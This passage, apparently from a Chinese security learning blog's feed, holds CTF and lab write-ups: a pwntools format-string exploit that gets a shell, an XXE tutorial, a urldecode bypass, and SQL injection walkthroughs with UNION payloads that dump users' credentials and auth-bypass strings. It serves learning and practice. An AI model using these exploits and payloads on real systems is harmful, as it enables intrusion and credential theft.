class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./login'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'108.160.139.79'</span></span><br><span class="line">port = <span class="string">'9090'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">lib = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(ip,int(port))</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">key = <span class="string">"wllmmllw"</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: \n"</span>,<span class="string">"pumpkin9"</span>)</span><br><span class="line">payload = <span class="string">"%15$p"</span></span><br><span class="line">p.sendlineafter(<span class="string">"password: \n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-241</span>-lib.symbols[<span class="string">'__libc_start_main'</span>]<span class="comment">#获取libc基地址</span></span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc)</span><br><span class="line">onegg = libc + lib.symbols[<span class="string">'system'</span>]<span class="comment">#获取system地址</span></span><br><span class="line">ls(<span class="string">"one_gadget"</span>,onegg)</span><br><span class="line">binsh = libc + lib.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#获取bin/sh地址</span></span><br><span class="line">ls(<span class="string">"sh addr"</span>,binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Try again!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="comment">#获取的是ebp中的内容</span></span><br><span class="line">target = stack <span class="number">-12</span> <span class="comment">#这个的计算结果为返回地址</span></span><br><span class="line">ls(<span class="string">"stack addr"</span>,stack)</span><br><span class="line">ls(<span class="string">"target addr"</span>,target)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">num = target&amp;<span class="number">0xff</span><span class="comment">#进行按位与运算目的是除去多余的位数，在这里是保留后12位</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="number">0x100</span><span class="comment">#onegg&amp;0xff</span></span><br><span class="line">data2 = (onegg&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span> <span class="comment">#右移位运算获取第二个字符位</span></span><br><span class="line">data3 = (onegg&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span><span class="comment">#获取第三个字符位</span></span><br><span class="line">data4 = onegg&gt;&gt;<span class="number">24</span><span class="comment">#获取第四个字符位</span></span><br><span class="line">li(<span class="string">"sys1"</span>,data1)</span><br><span class="line">li(<span class="string">"sys2"</span>,data2)</span><br><span class="line">li(<span class="string">"sys3"</span>,data3)</span><br><span class="line">li(<span class="string">"sys3"</span>,data4)</span><br><span class="line">data5 = binsh&amp;<span class="number">0xff</span><span class="comment">#同data1-4的作用</span></span><br><span class="line">data6 = ((binsh&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">data7 = ((binsh&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">data8 = binsh&gt;&gt;<span class="number">24</span></span><br><span class="line">li(<span class="string">"sh1"</span>,data5)</span><br><span class="line">li(<span class="string">"sh2"</span>,data6)</span><br><span class="line">li(<span class="string">"sh3"</span>,data7)</span><br><span class="line">li(<span class="string">"sh4"</span>,data8)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data1)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">1</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data2)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">2</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data3)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">3</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data4)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">8</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#参数放到返回地址后面即可</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data5)+<span class="string">"c%10$hhn"</span>)<span class="comment">#但是为什么要间隔四个字节呢</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">9</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#对于32位的程序根据libc中的system一般都要这样</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data6)+<span class="string">"c%10$hhn"</span>)<span class="comment">#先记住</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">10</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data7)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">11</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data8)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line"><span class="comment">#raw_input('#')</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,key)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web狗之xml实体攻击</title>
      <link href="/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/"/>
      <url>/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="web狗之xml实体攻击浅学"><a href="#web狗之xml实体攻击浅学" class="headerlink" title="web狗之xml实体攻击浅学"></a>web狗之xml实体攻击浅学</h2><a id="more"></a><p>我们先来了解一下xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;chybeta&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line">在上面代码中的第一行，定义XML的版本与编码。</span><br><span class="line"></span><br><span class="line">在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。</span><br><span class="line"></span><br><span class="line">同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</span><br><span class="line">我们再了解一下实体：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</span><br><span class="line">实体类型：</span><br><span class="line">XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</span><br></pre></td></tr></table></figure><p>文档类型定义：DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。</span><br><span class="line"></span><br><span class="line">其基本格式：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt;</span><br></pre></td></tr></table></figure><p>内部引入<br>格式：</p><!ENTITY 实体名称 "实体的值"><p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY chybeta &quot;Hello World!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xxe&gt;</span><br><span class="line">&amp;chybeta;</span><br><span class="line">&lt;&#x2F;xxe&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。</span><br></pre></td></tr></table></figure><p>外部引入<br>基本格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">通过引用定义在外部的DTD中的实体，我们称之为外部实体。</span><br></pre></td></tr></table></figure><p>之后呢，我们通过jarvis上的一道web题来尝试一下：<br><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br>我们先进行一下抓包<br><img src="https://img-blog.csdnimg.cn/20190405211355937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后呢我们发现第一个红箭头的位置，使用的是json方式传入<br>我们改为xml，之后编写代码进行传入<br><img src="https://img-blog.csdnimg.cn/20190405211630967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>go后我们得到flag<br><img src="https://img-blog.csdnimg.cn/20190405211650164.png" alt="在这里插入图片描述"><br>小白，还请多多关照</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>urldecode二次编码绕过</title>
      <link href="/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
      <url>/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="代码审计日志三urldecode二次绕过"><a href="#代码审计日志三urldecode二次绕过" class="headerlink" title="代码审计日志三urldecode二次绕过"></a>代码审计日志三urldecode二次绕过</h2><a id="more"></a><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>经过审计：<br>由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br></pre></td></tr></table></figure><p>可知，我们需要将hackerDJ进行urldecode编码后get上传<br>我们上传后得到：<br>not allowed!<br>再看url<br>发现我们get传入的url编码值被浏览器自动解码<br>因此我们需要再一次进行编码<br>上传后得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql语句之where字句学习笔记</title>
      <link href="/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="sql语句之where字句学习笔记"><a href="#sql语句之where字句学习笔记" class="headerlink" title="sql语句之where字句学习笔记"></a>sql语句之where字句学习笔记</h2><a id="more"></a><p>我们先说一下wherer字句作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">限制表中的数据返回  符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉</span><br></pre></td></tr></table></figure><p>1.两个极限条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where 1 &#x3D; 1</span><br><span class="line">where 1 &#x3D; 2</span><br></pre></td></tr></table></figure><p>自我感觉一般用来完善sql语法补齐引号<br>2.字符串条件的表达<br>就像我们爆表的那个常用语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><p>先说明一下<br>table_schema 的意思是数据库名<br>database()是返回当前的数据库名<br>因此此处的where意思是指：<br>查询的范围被限定在了此数据库中，即起到约束作用<br>3.模糊查询<br>格式为：<br>like（像）+ 通配符</p><pre><code>（1）    “%”为通配符，代表0 - n个任意字符（1）“-”代表一个任意字符</code></pre><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE keyword like &#39;%$keyword%&#39;</span><br></pre></td></tr></table></figure><p>意思就是此查询news中所有的含有我们所输入的$keyword的字符串（暂且先这样说）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where  name like  ‘_$keyword%’</span><br></pre></td></tr></table></figure><p>这个就是查询中间为我们所输入的字符串<br>@<br>当我们要查询例如’$keyword_’时，我们要进行转义<br>即使用\</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where name like &#39;$keyword\_%&#39;</span><br></pre></td></tr></table></figure><p>4.还有使用一些条件链接符号<br>进行限制条件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab 学习记录less2</title>
      <link href="/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/"/>
      <url>/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-lab-学习记录less2"><a href="#sqli-lab-学习记录less2" class="headerlink" title="sqli-lab 学习记录less2"></a>sqli-lab 学习记录less2</h1><a id="more"></a><p>less2<br>1.我们先来判断这次的sql注入类型<br>我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>发现第一个语句返回正确<br>但是第二个却有了报错<br>我们因此可以判断<br>这次的sql注入类型为数字类型</p><!-- more --><p>2.<br>之后和less1一样<br>我们进行暴表的名字（暴表）<br>我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><p>我们由此得到<br><img src="https://img-blog.csdnimg.cn/20190316101700495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.我们之后开始爆列喽<br>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure><p>我们可以得到<br><img src="https://img-blog.csdnimg.cn/20190316102305663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.最后我们来获得我们要得到的东西<br>输入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(id,username,password),3 from users</span><br></pre></td></tr></table></figure><p>就得到了我们要得到的东西<br><img src="https://img-blog.csdnimg.cn/20190316104403774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">另外<br>我们附加关于where的知识</p><p>table_schema是数据库名<br>database()函数会返回当前的数据库名<br><img src="https://img-blog.csdnimg.cn/20190316104540872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190316104550458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>where就是约束条件<br>这个 where后面  就是为了约束一下 我要查询的数据库  而不是去  看其他数据库里的东西<br>我要看的 东西 就是 当前数据库database里的  不是其他的数据里的<br>比如 有两个数据库  数据库1  数据库2   当前的数据库database是数据库1   你可以 where table_schema=database() 或者是where table_schema=’数据库1’</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注注入类型解释</title>
      <link href="/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/"/>
      <url>/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入类型简单记录"><a href="#sql注入类型简单记录" class="headerlink" title="sql注入类型简单记录"></a>sql注入类型简单记录</h1><a id="more"></a><p>sql注入类型简单记录<br>1.sql注入流程<br>（1）判断注入点<br>（2）判断注入类型<br>（3）判断数据库类型<br>（3）获得数据库数据，提权<br>一、判断注入点</p><p>所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般有三类<br>Get参数触发SQL注入<br>POST参数触发SQL注入<br>Cookie触发SQL注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一般我们输入&#39;来判断 是否存在注入点</span><br><span class="line">如果页面返回错误，则存在 Sql 注入</span><br><span class="line">原因是：</span><br><span class="line">原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</span><br></pre></td></tr></table></figure><p>二、判断注入类型<br>我们来了解一下：<br>有以下几种注入类型：<br>（1）数字型注入点<br>（2）字符型注入点<br>（3）搜索型注入点<br>（4）内嵌式sql注入<br>（5）终止试sql注入<br>之后我们进行解释：<br>1.数字型注入点<br>测试方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;1 返回成功</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;host&#x2F;test.php?id&#x3D;100 and 1&#x3D;2 返回失败</span><br></pre></td></tr></table></figure><p>为什么呢</p><p>假设我们网站的SQL查询的语句是这样的SELECT * FROM news WHERE id=$id<br>那么这个$id 即为用户提交的</p><p>当我们输入的是100 and 1=1<br>语句就变成了这样SELECT * FROM news WHERE id=100 and 1=1<br>对于and</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了</span><br><span class="line"></span><br><span class="line">而在and右边，1&#x3D;1也是恒成立的，所以整个语句返回的是成功</span><br><span class="line"></span><br><span class="line">当然，如果后面改成了1&#x3D;2的话，因为1&#x3D;2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1&#x3D;2最后会返回的是失败</span><br></pre></td></tr></table></figure><p>因此我们可以这样进行判断<br>2.字符型注入点<br>测试方法：</p><p><a href="http://host/test.php?name=man&#39;" target="_blank" rel="noopener">http://host/test.php?name=man&#39;</a> and ‘1’=’1 返回成功</p><p><a href="http://host/test.php?name=man&#39;" target="_blank" rel="noopener">http://host/test.php?name=man&#39;</a> and ‘1’=’2返回失败</p><p>这里就使上面的数字型变为了字符型</p><p>原因如下：</p><pre><code>还是假设我们网站的SQL语句是这样的SELECT * FROM news WHERE name=&apos;$name&apos;当我们构造输入为下面这个的时候man&apos; and &apos;1&apos;=&apos;1语句就变成了SELECT * FROM news WHERE name=&apos;man&apos; and &apos;1&apos;=&apos;1&apos;</code></pre><p>发现什么了没？这个SQL已经闭合了</p><pre><code>还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功同理可知如果后面是1&apos;=&apos;2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符</code></pre><p>比如这样</p><pre><code>http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;a 返回成功http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;b返回失败 </code></pre><p>3.搜索式sql注入</p><p>测试方法</p><p><a href="http://host//test.php?keyword=python%&#39;" target="_blank" rel="noopener">http://host//test.php?keyword=python%&#39;</a> and 1=1 and ‘%’=’</p><p><a href="http://host//test.php?keyword=python%&#39;" target="_blank" rel="noopener">http://host//test.php?keyword=python%&#39;</a> and 1=2 and ‘%’=’</p><p>假设我们的SQL查询语句是这样的</p><pre><code>SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos;这里的$keyword是用户的输入当我们输入以下语句的时候pt%&apos; and 1=1 and &apos;%&apos;=&apos;最终我们得到的语句是这样的SELECT * FROM news WHERE keyword like &apos;%pt%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos;这个语句又一次的闭合了</code></pre><p>这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误</p><p>我们可以把这个语句分为三段</p><pre><code>SELECT * FROM news WHERE keyword like &apos;%python%&apos;and 1=1and &apos;%&apos;=&apos;%&apos;第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入）第二句也是，第三句也是，因为自己肯定等于自己啊但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理</code></pre><p>4.内嵌式sql注入<br>内联注入是指查询注入SQL代码后，原来的查询仍然全部执行</p><p>假设我们的网站SQL查询语句是这样的</p><p>SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’</p><p>这一看就是个登录页面的代码</p><pre><code>假如我们构造如下语句提交到登录框中的username&apos; or &apos;&apos;=&apos;或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法提交到username我们的语句就会成为这样SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;</code></pre><p>fuzz是我们随便输入的字符串</p><pre><code>而提交到password则会是这样的SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;</code></pre><p>注:<br>    在SQL语句中，AND的优先级是大于OR的<br>    先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句</p><p>这是username框的</p><pre><code>SELECT * FROM admin WHER username=&apos;&apos;or&apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;</code></pre><p>或者password框的是这样</p><pre><code>SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos;or&apos;&apos;=&apos;&apos;</code></pre><p>我们首先用第一个来分析</p><p>首先计算AND之后</p><pre><code>SELECT * FROM admin WHER username=&apos;&apos;返回失败or&apos;&apos;=&apos;&apos; AND password 